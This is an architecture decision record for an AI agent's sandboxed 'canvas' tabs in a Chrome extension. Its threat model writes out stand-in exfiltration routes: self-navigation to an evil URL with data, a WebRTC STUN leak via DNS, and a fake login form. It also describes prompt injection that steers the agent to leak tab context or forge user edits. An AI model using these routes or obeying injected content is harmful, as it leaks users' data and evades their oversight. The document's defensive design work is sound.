# ADR: Canvas — agent-rendered documents, slides and diagrams beside the chat

- **Status:** Accepted 2026-10-10 (Brett; all §6 questions decided)
- **Date:** 2026-10-10
- **Author:** Brett Chien (drafted by Orca)
- **Related:** [chat markdown rendering](./chat-markdown-rendering.md) (§3.1 vendoring, §3.6 diagram
  engine, §3.7 CSP); `katashiro.show_image` (#59); reply-to (#61); [multi-conversation](./multi-conversation.md).

> Citations are inline as `[Key]` at the point of the claim; each key resolves in **References**.

---

## 1. Context

### 1.1 Problem — the chat bubble is the only output surface

An agent can only answer with text in a chat bubble (rendered markdown) or a static bitmap
(`show_image`). This does not fit several kinds of output Brett asks for:

- **Long documents** (an ADR draft, a report). They are narrow in the side panel, scroll away, and
  every revision is re-sent in full as a new bubble, so you cannot see "the current version".
- **Slides.** There is no presentation surface at all.
- **Charts and diagrams.** The agent container has no browser. `mmdc` fails without
  chrome-headless-shell, so today a diagram means hand-written SVG pushed through `show_image`.
- **Iteration.** You cannot edit what the agent produced, and the agent cannot see your edits.

What we want is close to Claude's artifacts and ChatGPT's canvas `[Artifacts]` `[Canvas]`: a persistent,
versioned surface next to the conversation that the agent renders into and updates live.

### 1.2 Constraints

- **The panel holds the tokens.** The side panel's `chrome.storage` holds ACP keys and the Jev token.
  The markdown ADR's threat model `[MD-ADR §1.2]` applies with more force here: canvas content is
  agent-authored and may echo a web page the agent read. **Agent-authored HTML or JS must never run
  in an extension-page origin** (the panel, or any page that can reach `chrome.*`).
- **MV3 CSP.** Extension pages run under `script-src 'self'`, and `'unsafe-eval'` cannot be granted
  `[MV3-CSP]`. That is why the markdown ADR leaned towards dagre over mermaid `[MD-ADR §3.6]`.
  **Sandboxed pages** declared in `manifest.sandbox.pages` get a unique opaque origin, have no
  `chrome.*` extension APIs, and have their own `content_security_policy.sandbox` `[MV3-Sandbox]`.
  This is the escape hatch: rich and even scripted content runs there, cut off from the tokens.
- **Transport.** Agent → Katashiro is the MCP-over-ACP tunnel (tool calls), the same path
  `show_image` uses (≤ 5 MB decoded). The agent sends content as tool arguments, so bytes go into
  the model's context unless a shell helper posts them to the facade (the `show_image` skill pattern).
- **No build system.** Libraries are vendored as prebuilt bundles and pinned exactly
  (`vendor/BUILD.md`, `scripts/vendor-build/`).

---

## 2. Research — prior art and libraries (checked 2026-10-10)

- **Claude artifacts / ChatGPT canvas** `[Artifacts]` `[Canvas]`: content lives beside the chat,
  untrusted code runs in an isolated frame, and revisions are versions of one object rather than
  new messages. ChatGPT canvas lets the user edit, and the model then edits on top of those edits.
- **reveal.js 6.0.2** (MIT) `[Reveal6]`: 6.0 (2026-03) moved plugins to `dist/plugin/<name>.js`,
  renamed `.esm.js` to `.mjs`, and ships TS types plus an official `@revealjs/react`. The markdown
  plugin uses `---` as the slide separator. There is a new `sync` event and `removeHiddenSlides()`,
  which suit live re-render. Export is **PDF only**, via `?print-pdf` and the browser print dialog.
  There is no pptx import or export.
- **Mermaid 12.1.0** `[Mermaid12]`: ELK is now the default layout, and it needs ES2024 (fine in
  Chrome). The full package is 116 MB unpacked; **`@mermaid-js/tiny` is a 2.7 MB single file**.
- **Chart.js 4.5.1** (203 KB UMD), **uPlot 1.6.32** (~50 KB, time series).
- **pptx:** `pptxgenjs` 4.0.1 (MIT, 450 KB) writes pptx in the browser from a slide model.
  `pptxtojson` 2.2.0 (MIT) parses pptx into JSON. `dom-to-pptx` 2.1.2 converts rendered HTML into
  editable pptx (untested).
- **Editors:** `@milkdown/crepe` 7.22.3 (7.22.2 dropped images without a title, #86) (MIT, ProseMirror, markdown-native WYSIWYG) and CodeMirror 6.
  **Brett chose Milkdown over Quill (2026-10-10).** Quill 2.0.3 (BSD-3, 204 KB, last release 2025-01)
  stores a Delta/HTML model, so every agent ↔ user round trip through markdown loses something: it has
  no default horizontal-rule format (`---` slide breaks), drops code-fence languages, and converts
  tables unreliably. Measured crepe bundle (esbuild IIFE, CSS excluded): **2.7 MB minified, 906 KB
  gzip**, 0 `eval`, 0 `new Function`, and 2 `Function(`: a `Function("return this")` global
  fallback, and a `Function("", "var x …")` syntax probe inside `try`, which the sandbox CSP blocks
  and the `try` absorbs. The smoke test below covers it.
- **eval scan (static grep of the dist files):** reveal.js has 0 `eval` and 0 `Function(`. Chart.js
  has none (only identifiers named `…Function(`). `mermaid.tiny.js` has 0 `eval` and 4
  `Function("return this")()` global-object fallbacks that sit behind `self` checks. pptxgenjs has
  core-js polyfill fallbacks. The grep is not a safety control: the sandbox CSP has no
  `'unsafe-eval'`, so any eval is blocked regardless. The real risk is **functional**: a library
  whose fallback throws, or mermaid 12's default ELK layout trying to start a Worker (blocked by
  `worker-src 'none'`). So each engine gets a **smoke test that renders a fixture inside the real
  sandbox CSP and fails on any `securitypolicyviolation` not on a per-engine allow-list**. An entry
  matches on `violatedDirective` + `sourceFile` + `sample`; the initial entries are the known,
  absorbed probes (crepe's `Function("", …)` syntax probe, and the `Function("return this")`
  global fallbacks in crepe and mermaid-tiny, if they fire). A new or changed violation fails the
  test until someone reviews it. For mermaid, check whether `@mermaid-js/tiny` bundles ELK and
  whether it runs without a Worker.
  *As implemented (mermaid, 2026-10-11):* `@mermaid-js/tiny` 12.1.0 does **not** bundle ELK. It
  registers only the `dagre` and `swimlane` layouts, and an `elk` request falls back to dagre with
  a console warning. Layout runs on the main thread, so no Worker is ever constructed. The frame asks
  for `layout: "dagre"` explicitly (and `state.layout`, whose default is `elk`). The smoke test is
  `scripts/smoke-mermaid.mjs`. It needs Chrome, so it is not part of `node --test`. It serves
  `canvas-frame.html` with the manifest's sandbox policy as a CSP header (opaque origin, on top of
  the meta CSP) and drives it with `render{}` like `canvas.html` does. The fixture holds flowchart,
  sequence, state and class diagrams plus a broken one, a `mermaid` canvas and a slide with a
  diagram. Violations are recorded by a CDP-injected listener in every frame, and a deliberate
  `img-src` violation checks the recorder works. Result in chrome-headless-shell 154: **0
  violations** (the four `Function("return this")` fallbacks are never reached), **0 Workers**, and
  the allow-list is empty.

---

## 3. Decision

### 3.1 Surface — one Chrome tab per canvas, grouped (decided by Brett, 2026-10-10)

Each canvas opens in **its own extension tab** (`canvas.html?id=<canvasId>`), never inside the panel:

- The panel is ~400 px wide. Slides and documents need the full tab width.
- **One Chrome tab per canvas, gathered in a native tab group per conversation** (title = the
  conversation title, or "Canvas" until multi-conversation lands; fixed color: blue), in the panel's
  window. Canvases stay together and out of the user's page tabs; the group can be collapsed to one chip.
  This needs no tab UI of our own: drag, pin, close and Split View are Chrome's.
- The chat gets a **card** in the agent's turn, `📄 <title> · v<N> — Open`. Clicking it focuses that
  canvas's tab, or reopens it in the group if it was closed. A tab shows one canvas, always its latest
  content (older versions are kept in history, §3.5, but there is no way to show or step back to one; Revert to agent's restores the agent's last write). A new canvas from the agent opens a new tab in the group without stealing focus.
- **Split View beside a web page.** Katashiro's `split_tabs` requires both tabs to share window,
  pinned state and tab group (it checks this before `tabs.createSplit`, following Chrome's split
  rule; Chrome's own rejection has not been tested live). So "canvas beside this page" temporarily
  moves the canvas tab **out of its group** (into the page's group, if any), splits, and moves it
  back when the split ends or the page closes. Two canvases split directly, being in the same group.
  Agent form: `canvas_open(…, beside: "current")`: "this page" is the active tab of the panel's
  window. Refused (the canvas tab is just brought to the front, and the result says why) if that
  tab is not a web page (`chrome://`, an extension page, a compare tab), either tab is already
  split, they are in different windows, or only one is pinned — Katashiro does not unsplit, pin or
  move windows for the user. Without `tabs.createSplit` (Chrome < 155) the tab is only focused.
  If the canvas group is gone when the tab moves back (it was the group's only tab, and Chrome
  removes an empty group), the group is recreated.
- If the user drags a canvas tab out of the group or deletes the group, Katashiro does not fight
  it: the next `canvas_open` in that conversation recreates the group, and stray canvas tabs are
  found again by URL (ignoring compare tabs, `view=agent`, §3.10).
- With multi-conversation, each conversation has its own group. **Not in phase 1** (§6 Q5):
  per-conversation group titles and switch handling wait for multi-conversation
  ([multi-conversation](./multi-conversation.md): group titles in its MVP §3.3, switch handling in
  P1b §4.2, where the group also takes the agent's own tabs). Collapse-on-switch, planned here, was
  dropped there (Brett 2026-10-13): groups stay expanded until the conversation is archived.
- **Full width (Brett, 2026-10-10).** The canvas uses the whole tab: no centered fixed-width
  column like GitHub's file view. Documents fill the viewport with modest side padding (~24 px);
  tables and code blocks take all the width they need, and slides scale to the tab. The host
  header (title, revision, Edit/Save, Send to agent, Revert to agent's, export) is one slim bar so the content keeps
  the height too.
- The panel never renders canvas content itself.
- Where the data lives and how each party reaches it: §3.9.

**Implementation rules for tab and group moves** (Chrome tab APIs are async and the MV3 service
worker can be suspended at any point). Phase 1 runs these moves in the side panel
(`canvas-tabs.js` decides, `sidepanel.js` calls Chrome), which is alive whenever an agent can call
`canvas_open`; the split bookkeeping is in panel memory, so a panel reload forgets it and that
canvas tab stays in the page's group. Moving it to the service worker with `storage.session` is
the rule below, not yet done:
- **One queue per conversation.** Every group operation (create the group, add a tab, split
  in/out) runs in a per-conversation queue, and the `groupId` lives in `storage.session`. Two quick
  `canvas_open` calls therefore create one group, not two.
- **No in-memory state across events.** Tab/group listeners are registered at the top level of
  the service worker. Before a split move, the canvas tab's original group and index are saved to
  `storage.session`. Whether Chrome emits a reliable "split ended" signal (e.g. a split field in
  `tabs.onUpdated`) must be tested; if not, the move back happens lazily on the next `canvas_open`
  or when the tab is focused.
- **Move back only if nothing changed.** The tab is returned to its group only if it is still where
  Katashiro put it and the original group still exists (the canvas group itself is recreated:
  Chrome drops a group whose last tab left, which the split move alone causes for a lone canvas).
  If the user dragged it elsewhere, closed another group it was in, or moved it to another window,
  it stays put, and the next `canvas_open` sorts it out.
- **Re-check after every await.** A move sequence (ungroup → split) re-reads tab state after each
  step; if a tab or group has gone (the user closed the page mid-move), it rolls back to the
  previous state instead of assuming the last step succeeded.
- **Duplicate tabs of one canvas** (the user duplicated the tab): both editors save with their
  `baseVersion`, so the later save gets the conflict view (§3.5). The card focuses the most
  recently used tab of that canvas, never a compare tab (`view=agent`, §3.10).
- **Conversation switch:** groups are not collapsed (multi-conversation §4.2, Brett 2026-10-13);
  if the active tab is in the old conversation's group, a tab outside it is activated (the new
  group's tab, or the web page).

### 3.2 Isolation — host page plus sandboxed frames

```
canvas.html  (extension page — trusted chrome: title, revision, banner, export; NEVER agent HTML)
  ├─ <iframe src="canvas-frame.html#<nonce>">       (sandbox page: our engines + editors, no agent script)
  │     renders markdown / slides / image / chart / mermaid; hosts the phase 2 editors
  └─ <iframe src="canvas-html-frame.html#<nonce>">  (sandbox page, phase 2: agent HTML + inline script)
        renders one `html` canvas; view-only, never sees edits or other canvases
```

Both are `manifest.sandbox.pages`: opaque origin, no `chrome.*` `[MV3-Sandbox]`.

**What the sandbox does and does not stop.** `connect-src 'none'`, `img-src data: blob:`,
`form-action 'none'`, no `allow-popups` and no `allow-top-navigation` close fetch, image beacons,
form posts, `window.open` and navigating the top page. CSS `url()` falls under `img-src`/`font-src`
and `@import` under `style-src 'self'`, so they are closed too. `blob:` cannot be navigated to, and
downloads need `allow-downloads`. **They do not stop the frame from navigating itself**
(`location = "https://evil/?d=…"`): removing `allow-top-navigation` only protects the top page, and
the CSP `navigate-to` directive never shipped. A clicked link in rendered markdown does the same.
After such a navigation the attacker page is the same WindowProxy, so `event.source` still matches,
and a sandboxed origin is `"null"` either way, so `event.origin` cannot tell them apart. Everything
below is built around that.

- **Load gate.** The host listens for the iframe's `load` event and counts the loads it caused
  itself (the initial `src`, and the print reload in §3.8). **Any other load means the frame
  navigated away:** the host removes the iframe, shows a warning, and sends nothing more. Without
  this, the next `render` (posted with `'*'`, the only option for an opaque origin) would go to the
  attacker page. Counting alone can misattribute a load if the frame navigates itself around a
  host-caused reload, so **every host-caused load gets a fresh nonce**, and the host sends `render`
  only after a `ready` carrying that new nonce.
- **No navigation by links.** A capture-phase listener on the frame's `document` handles `click`
  and `auxclick` (middle click), finds `event.target.closest('a, area')` (this covers SVG `<a>` from
  mermaid or sanitized SVG), calls `preventDefault`, and sends `openLink{url}` instead. The host
  accepts only `http:`/`https:`, shows the full URL, and opens it in a new tab after the user
  confirms. `target` attributes are stripped by DOMPurify. Mermaid runs with
  `securityLevel: 'strict'`, so its `click` directive is disabled.
- **Nonce.** The host generates a random nonce per load and puts it in the `src` fragment. The
  frame reads it once and includes it in every message; the host drops messages without it. This
  holds in `canvas-frame.html`, which runs no agent script. In `canvas-html-frame.html` agent script
  can read the hash, so there it is only a second check behind the load gate.
- **Messages before the gate fires.** After a navigation, the new document's script runs before the
  iframe's `load` event, so an attacker page can post first. That is why the allow-lists below stay
  harmless on their own, and why the host renders `error{msg}` only with `textContent`, capped at
  500 characters.
- **Host → frame:** `postMessage({type:"render", nonce, kind, content, version, seq})` (plus the
  §3.10 glow fields `glowPrev`, `glowRanges`, `glowAgainst`). The frame never
  fetches anything; everything it shows arrives in this message. `seq` is the host's render number,
  echoed back in `rendered{}` / `diagramError{}`, so two renders of the same version are told apart (#96).
- **Frame → host — per-frame allow-lists.** The host checks `event.source` against that frame's
  `contentWindow`, the nonce, the type and fields, caps sizes, and treats the payload only as data.
  - `canvas-frame.html`: `ready`, `rendered{version, seq, normalized?}` (§3.5), `error{msg, seq?}` (`seq`:
    the render that failed; one from an older render than the host's latest is dropped), `openLink{url}`,
    `save{content, baseVersion}` (phase 1, markdown editing; slides from phase 2), and
    `selection{text, seq, truncated?, rect?, where?}` (Ask agent, §3.7; implemented: ≤ 20 K chars, refused from a
    compare tab like `save`; `seq` is the render it was made in, and one from an older render is
    dropped, #107 — by seq, not version: a same-version re-render replaces the DOM too; `rect`
    `{top, bottom, left, right, x}` is where the selection is in the frame's viewport, `x` its end,
    absent while it is out of view — finite and bounded, and the host clamps it to the frame box:
    it only places the host's 💬, §3.7; `where{headings?, lines?, slide?}` says where it is, each
    part checked and capped by the host and dropped alone when malformed, §3.7),
    `selectionRect{seq, rect?}` (#125: the same selection moved — scroll, resize, slide change —
    so only its rect is re-sent, never the text or where; refused from a compare tab), and
    `undoState{canUndo, canRedo}` (the editor's undo stack, for the edit-mode ↶ / ↷ buttons, §3.5;
    refused from a compare tab, and acted on only in edit mode).
  - `canvas-html-frame.html`: `ready`, `rendered{version}`, `error{msg}` only. **`save`,
    `selection` and `undoState` are refused**, so agent script cannot forge a "user" edit. Otherwise a forged
    `save` would be stored as `author:"user"` and read back by the agent as user intent: prompt
    injection laundered into the user's voice.
- **Not web-accessible.** `canvas.html`, `canvas-frame.html` and `canvas-html-frame.html` must never
  be listed in `web_accessible_resources`. Otherwise any web page could frame or open
  `canvas.html?id=…`, which adds a clickjacking surface and an entry point for guessing ids.
- **Titles** come from the agent. The host renders them with `textContent` only, capped at 120
  characters.
- **CSP, in two layers.** `content_security_policy.sandbox` is **one policy for every sandbox
  page**, so it is the loosest any frame needs:
  ```
  sandbox allow-scripts allow-modals; default-src 'none'; script-src 'self' 'unsafe-inline';
  style-src 'self' 'unsafe-inline'; img-src data: blob:; font-src 'self' data:;
  connect-src 'none'; frame-src 'none'; worker-src 'none'; form-action 'none'; base-uri 'none'
  ```
  (`'unsafe-inline'` in `script-src` only from phase 2, when `canvas-html-frame.html` exists.)
  Each page then tightens itself; a second policy can only add restrictions:
  - `canvas-frame.html` carries `<meta http-equiv="Content-Security-Policy" content="script-src
    'self'">`, so a DOMPurify bypass in markdown still cannot run script.
  - The host sets the iframe `sandbox` attribute per frame (flags from the attribute and the CSP
    both apply): `allow-scripts allow-modals` for `canvas-frame.html` (modals are needed to print,
    §3.8, and no agent script runs there), and plain `allow-scripts` for `canvas-html-frame.html`.
  Chrome documents that a custom sandbox CSP must keep `sandbox` with `allow-scripts`. Its default
  is `sandbox allow-scripts allow-forms allow-popups allow-modals; script-src 'self' 'unsafe-inline'
  'unsafe-eval'; child-src 'self'` `[MV3-Sandbox]`, so ours is a strict tightening. To verify during
  implementation: Chrome loads the extension with it, and the meta CSP is enforced in the frame.
- **CSP violations are reported.** Each frame listens for `securitypolicyviolation` and sends it as
  `error{}`, so a library that hits a blocked eval or Worker fails visibly, not silently.

**Residual risk.**
- `canvas-frame.html` (all of phase 1): no agent script runs, links go through `openLink`, and the
  load gate catches anything else. **Content has no way out except the allow-listed messages.**
- `canvas-html-frame.html` (`html` kind, phase 2): **content can leave, and the ADR says so.** Agent
  script can navigate the frame with data in the URL (the load gate notices only afterwards), and
  can exfiltrate through WebRTC (`RTCPeerConnection` with a `stun:<data>.evil.com` ICE server
  reaches DNS/UDP; Chrome does not implement the CSP `webrtc` directive, and `connect-src` does not
  cover it). `<link rel=dns-prefetch>` has historically bypassed CSP; test it during
  implementation. What limits the damage: the frame only ever receives its own canvas content,
  never edits, other canvases or anything from the panel. A fake login form there **can** send what
  the user types. The host therefore shows a permanent banner on every canvas, *"Agent-generated
  content — Katashiro never asks for passwords or keys here"*, and the `html` kind sits behind a
  setting the user can turn off (§6 Q2; on by default per Brett).
  **`html` is on by default, but its script runs only after the user clicks Run scripts** (§6 Q8).
  Until then the canvas is shown without script in `canvas-frame.html`, where the "no way out"
  property above holds. Without that click, `canvas_open({kind:"html"})` would be a way to send
  data out **without act mode**: an agent steered by prompt injection on a page it read could put
  context from other tabs into an `html` canvas that navigates to `evil.com?d=…` or uses a STUN
  server, where doing the same through the browser tools would need act mode. Click to run closes
  that bypass. **What remains:** once the user clicks Run scripts, that revision can exfiltrate
  exactly as described above, both what the agent put in and what the user types into it. The
  click authorizes running the script; it does not make the content trustworthy, and the banner
  stays.

### 3.3 Content kinds, in phases

| Phase | `kind` | Engine (vendored, exact pin) | Notes |
|---|---|---|---|
| 1 | `markdown` | existing markdown-it + DOMPurify + hljs | same sink as the chat, full width |
| 1 | `slides` | reveal.js 6.0.2, fed by markdown-it + DOMPurify | `---` between slides; PDF via print |
| 1 | `image` | existing `show_image` decode path | `imageId` (screenshot) or `data` |
| 2 | `chart` | Chart.js 4.5.1 | JSON config only; no JS callbacks |
| 2 | `html` | none (agent HTML + inline JS) | own frame (§3.2); approved by Brett; **click to run** per revision (§6 Q8); a setting can turn it off; implementation spec: [canvas-html](./canvas-html.md) |
| 3 → done (2026-10-11) | `mermaid` | `@mermaid-js/tiny` 12.1.0 | also renders ```` ```mermaid ```` fences in `markdown` (and `slides`) |

- Phase 1 runs **no agent-authored script**. Every engine is our own vendored code.
- **Markdown canvases are editable from phase 1** (Milkdown crepe, §3.5). Slides get the
  CodeMirror 6 source + live preview editor in phase 2.
- **Slides are sanitized like markdown.** reveal's markdown plugin parses with marked, which passes
  raw HTML through, and its `<!-- .element: … -->` comments set attributes. We do not use it.
  Instead we split on `---`, render each slide with markdown-it + DOMPurify (the chat's sink), and
  hand reveal finished `<section>` elements. Per-slide attributes, if ever needed, come from a small
  allow-list we parse ourselves.
- **What `html` is for** (anything that needs interaction, not just display): a cost or capacity
  calculator with sliders (e.g. Fargate Spot vs on-demand); a sortable, filterable table of data the
  agent gathered (PRs, logs, prices); a collapsible timeline or checklist; a side-by-side option
  comparison with toggles; a small simulation or animated explainer; a quiz or flashcards. Static
  documents, decks, charts and diagrams do **not** need it; the safer kinds cover them.
- **Click to run (§6 Q8).** An `html` canvas first renders without script in `canvas-frame.html`;
  only the user's **Run scripts** click loads it into `canvas-html-frame.html`, once per revision.
- Phase 2's `html` kind is the first to run agent script, only in `canvas-html-frame.html` (§3.2).
  Still no fetch and no eval, but not leak-proof (§3.2 residual risk).
- **Mermaid supersedes the markdown ADR's dagre lean** `[MD-ADR §3.6]`. That lean existed because
  mermaid could not run on an extension page, and in the sandbox it can. Chat bubbles keep showing
  mermaid fences as code; the canvas renders them.
  *As implemented (moved up from phase 3, Brett 2026-10-11):*
  - `markdown.js` gives a ```` ```mermaid ```` fence's `<code>` the constant class `language-mermaid`.
    The chat still shows it as code. The frame renders exactly those fences, in `markdown` and
    `slides` canvases, and loads the 2.7 MB engine only when the rendered view has one (a
    `mermaid` canvas always does).
  - `mermaid.initialize` is called with `securityLevel: 'strict'`, `theme: 'dark'`,
    `layout: 'dagre'`, `htmlLabels: false` and `suppressErrorRendering: true`. `htmlLabels: false`
    makes most labels SVG text, but not all: journey tasks and venn text are `<foreignObject>` HTML
    whatever it says, and a `%%{init}%%` directive can turn it back on. The SVG then goes through
    DOMPurify as well, a second check behind mermaid's own sanitizing: the svg, svgFilters and html
    profiles, with `foreignObject` added and made an HTML integration point (DOMPurify otherwise
    drops HTML under SVG, which blanked those labels with no error). The HTML in it is held to the
    same html profile as the markdown sink, and `script-src 'self'` stands behind both. This is a
    separate sink from the chat's: `[MD-ADR §3.2]` (pinned config, no relaxing, no svg profile)
    governs the chat's `renderMarkdownInto` and is unchanged; the canvas diagram config is set
    apart on purpose. It returns a DOM fragment that is inserted as is, not re-parsed.
  - `@mermaid-js/tiny` leaves out mindmap and architecture (they need cytoscape); such a diagram
    fails like a syntax error. The smoke test draws each other type the tool names and checks that
    the sanitized SVG keeps all of mermaid's text.
  - Each render gets a fresh id. The SVG and its scoped `<style>` replace the fence, so a re-render
    leaves nothing behind (checked by the smoke test).
  - A diagram with a syntax error keeps its source, and its error is shown above it with
    `textContent`. It is reported as **`diagramError{msg, seq}`**, not `error{}`: the rest of
    the canvas stands, the render is not marked failed, and pending goto / highlight carry on. The
    host drops a report whose seq is not the render in progress, and offers *送給 agent 修*; the
    header says a diagram failed and the rest rendered, so the agent patches that fence instead of
    rewriting the canvas. If the engine itself fails to load, every fence keeps its source with
    that note and one report goes up without a diagram number.
  - A diagram is **one block** for §3.10, keyed by its source (`mermaid:<source>`). A failed or
    unrendered fence has the same key, so a compare's other side need not be rendered. Changing one
    diagram glows only that diagram. `canvas_highlight` can find a diagram by its source text. The
    copy button on a diagram copies its source.
  - **Print:** the document's diagrams are re-rendered with mermaid's light `default` theme, then
    the frame prints and switches back to dark. A deck prints on its own dark slides and stays dark.
  - **`kind: "mermaid"`:** the whole canvas is one diagram source, shown like a lone fence that
    fills the tab. It is stored as sent (no normalization) and can be changed with `canvas_patch`,
    but is not editable in the canvas. It has ⬇ `.mmd` download, PDF, glow and 顯示變更. The folder
    mirror (§3.6) writes it as a `.md` holding one ```` ```mermaid ```` fence.
  - Milkdown normalization keeps mermaid fences byte for byte (smoke test).
  - **Links (§3.2):** `strict` disables `click` *callbacks*, but a `click X "url"` link is still
    drawn, as an SVG `<a>`. The capture-phase listener covers it. It reads `href` (or `xlink:href`)
    from the attribute, because an SVG `<a>`'s `href` property is an `SVGAnimatedString`, which
    `postMessage` cannot clone (before this fix, the click was swallowed and no `openLink` was sent).
    The host's confirm then applies as for any link (smoke test).
- React/Babel: not planned. Babel needs eval, and `html` + Preact (`htm`, no build step) covers
  the cases.

### 3.4 Agent tools

| Tool | Does |
|---|---|
| `katashiro.canvas_open({title, kind, content \| imageId \| data, id?, baseVersion?, beside?})` | Without `id`: creates a canvas and returns `{id, version: 1}`. With `id`: a new version, re-rendered live; **`baseVersion` is then required** (no blind writes). `beside: "current"` also shows it in Split View beside the user's current page (§3.1); the result says where it went or why not |
| `katashiro.canvas_read({id, diff?})` | Returns the latest content (including **user edits**) with `{version, author, at, agentVersion}`; `diff: true` returns only the diff from the agent's last write to now |
| `katashiro.canvas_list()` | Lists the conversation's canvases: id, title, kind, latest version, last author |
| `katashiro.canvas_patch({id, baseVersion, edits:[{find, replace}]})` | Patches a long document without resending it (§3.5 rules). Implemented: `markdown`/`slides` only, ≤ 50 edits, `find` ≤ 32 K and `replace` ≤ 512 K chars, result ≤ 2 MB. Matching and writing run in `CanvasStore.agentPatch` under the `canvas:<id>` lock; the write itself is the same agent write as `canvas_open` (card, normalization wait, mirror, index, budget). Errors are JSON: `stale` (+ `failedEdit`) when the canvas moved on and a `find` missed, else `{error:"patch", edit, count, overlaps?}`; success after a user edit adds `rebasedOver` (+ `diffFromBase`) |
| `katashiro.canvas_delete({id})` | Deletes a canvas of the conversation after the **user confirms** in the side panel (Brett, 2026-10-10: any canvas, the confirmation is the only gate); declined → nothing deleted, `declined`. The question is a **confirm card** in the asking agent's turn (#80), not `window.confirm`, which blocked the panel's main thread and froze every agent in the room: 🔒 header and a fixed amber border that agent markdown cannot produce, the title as one plain-text line (newlines, control and bidi characters become spaces, so a title cannot add lines such as "(temp file, safe to delete)"), **允許 / 拒絕**, no answer in **2 minutes = declined**, a cleared chat = declined; the card then stays in the chat as 已允許 / 已拒絕 / 已拒絕（逾時）. A request an agent makes **after its turn has ended** (it was stopped or failed while an earlier card waited, and its next `canvas_delete` arrives afterwards — tool calls run one after another) gets **no card**: it declines at once, a one-line notice says the agent's turn had ended and the request was not carried out, and the agent gets `declined: the turn ended before the user was asked` (one still on screen when the turn ends: 已拒絕（回合已結束）, `declined: the turn ended before the user answered`). A card on its own row (asked outside an agent's turn) is left-aligned and full width. Several cards can wait at once; nothing blocks. It says so when the canvas is open in a canvas tab (unsaved edits there are lost). After 允許 the store re-reads the meta under the `canvas:<id>` lock and removes only the version the user was asked about (`remove({expectVersion})`); if it moved meanwhile (a user save, another agent's write) nothing is deleted and the agent gets `changed while asking, not deleted`. A deleted canvas's open tab closes (any delete path), unless it holds unsaved edits, which stay on screen to be copied out |
| `katashiro.canvas_goto({id, slide})` | Brings a **slides** canvas's tab to the front and shows slide N (1-based, clamped); returns the slide shown and the deck length (Brett, 2026-10-10). Reached panel → canvas tab by extension runtime messaging, then the nonce channel to the frame (`goto{slide}` in, `slide{index,total}` out). Only the side panel's messages are accepted (not content scripts); every goto is answered (frame error or drop, newer goto, 5 s canvas timer, panel deadline). If the canvas is open in two tabs both move and the first answer wins |
| `katashiro.canvas_view({id?, showChanges?, compare?})` | The agent's equivalent of the header's display switches (§3.11, Brett 2026-10-12): `showChanges` sets ◐ 顯示變更, which is **global** (every canvas tab, like the button); `compare: true` / `false` (needs `id`) starts ⇆ Compare with agent's for that canvas or ends it (✕ 結束比較), with the button's preconditions and the button's path |
| `katashiro.canvas_gallery({query?})` | Opens 🗂️ the gallery tab (§3.7), or brings the open one to the front, optionally with its search box set to `query` (§3.11) |
| `katashiro.canvas_highlight({id, find \| heading, label?, durationMs?})` | Phase 1: points the user at a part of the canvas (glow + optional label, scrolls to it), like `katashiro.highlight` on pages (§3.10). Implemented in PR 6: `markdown`/`slides` only; label ≤ 80, `durationMs` 500–10 000 (default 4 000), one call per 1.5 s per canvas (a call that showed nothing gives its slot back). Panel → canvas tab by runtime messaging (side panel only, compare tabs never answer), then `highlight{reqId,…}` in / `highlighted{reqId, ok, tag?, text?, slide?, error?}` out on the nonce channel. An open tab is brought to the front only after it showed the block; while the user edits, the frame only checks the anchor and the result says `not shown yet` |
| `katashiro.canvas_inject_css({id, css \| clear})` | (Brett, 2026-10-15) `inject_css` for a canvas: page tools cannot script a canvas tab (an extension page; they are refused there with a message naming the canvas tools). Same sheet rules as `inject_css` (≤ 20 000 chars; nothing that fetches, no CSS escapes), checked in `browser-mcp.js`. Panel → canvas tab by runtime messaging (`katashiro-canvas-css`, side panel only, compare tabs never answer); every open tab of the canvas keeps the sheets (≤ 10) in memory and sends all of them as `css{sheets}` on the nonce channel on each change and on each frame (re)mount, so they survive re-renders and print; a tab reload drops them. The frame puts them in one `<style>` last in its head (sandbox CSP `style-src 'unsafe-inline'`; `connect-src` / `img-src` / `font-src` stay closed, a second line behind the fetch refusal) and disables it while the user edits. Refused while editing; `clear` always works and never opens a tab. A canvas not open is opened in front, an open one is brought to the front once it applied the sheet. Not callable from a background conversation (it shows something). |

- Caps: 2 MB text per version, 5 MB images (as `show_image`). Writes are rate-limited like `notify`.
- Large payloads use a shell helper that posts to the facade (the `show_image` skill pattern), so
  the content does not pass through model output twice.
- **Not gated by act mode, for every kind.** Like `show_image`, they change nothing on any web page.
  Every kind except `html` also has no way out of the sandbox (§3.2). An `html` canvas can send data
  out only after the user clicks **Run scripts** for that revision (click to run, §6 Q8, §3.2
  residual risk), so it needs no act-mode gate.

### 3.5 Versions and concurrency (markdown editing in phase 1, slides in phase 2)

- **Version history: the last N versions (Brett, 2026-10-11, §6 Q7; replaces "no version
  history", 2026-10-10).** Every save adds 1 to `version` and records `{author: "agent" | "user" |
  "file", at}` (`file` = imported from the folder mirror after the user clicked Import, §3.6). A
  canvas keeps its **last N versions, each with its full content** (no diffs). **N = 10 by
  default**, a setting (Settings → 畫布版本紀錄, 1–50, `canvas:historyMax` in
  `chrome.storage.local`); it is read on every write, so a change applies from each canvas's next
  write on (nothing is trimmed at the moment it changes).
  - **`latest` and `previous` are pointers into the history:** the newest entry and the one before
    it (`previous` only when it is latest − 1: with N = 1 the entry before the latest can be the
    pinned agent write, and then there is no previous). The **agent's last write** (`agentVersion`)
    is a third pointer and is **pinned**: while it is the agent copy it is never trimmed, even when
    it is older than the last N (so a canvas holds at most N + 1 versions). Send to agent's diff (§3.7), the `stale` diff below, **Revert to
    agent's** (the header button that makes the agent's last write the latest again, as a user
    save), Compare with agent's (§3.10) and `rebasedOver.diffFromBase` read that entry and work as
    before.
  - **Trimming happens on write, only there:** the new version is appended, then the oldest entries
    beyond N are dropped, the pinned one kept. History is never trimmed to make room in the budget
    (§3.6 evicts whole canvases instead).
  - **No version walking in the view (Brett, 2026-10-11 21:13: "just use editor's undo/redo").**
    #117 shipped ↶ / ↷ header buttons in view mode that saved an older version's content as a new
    version (v8 latest → ↶ wrote v9 = v7's content); tried in real Chrome, "↶ saves the old content
    as a new version" read as weird, so they are gone, with the walk state they kept in meta. History
    stays for what reads it: ◐ 顯示變更 (previous → latest, §3.10), the agent's pinned copy (Revert,
    Compare, Send to agent) and `stale` / `rebasedOver` `diffFromBase`. There is no version list
    and no way to show an older version in the tab.
  - **Undo / redo is the editor's own (edit mode only).** While ✏️ editing, **↶ 復原 / ↷ 重做**
    buttons sit in the header next to 💾 儲存 / 結束編輯 and run Milkdown's ProseMirror history
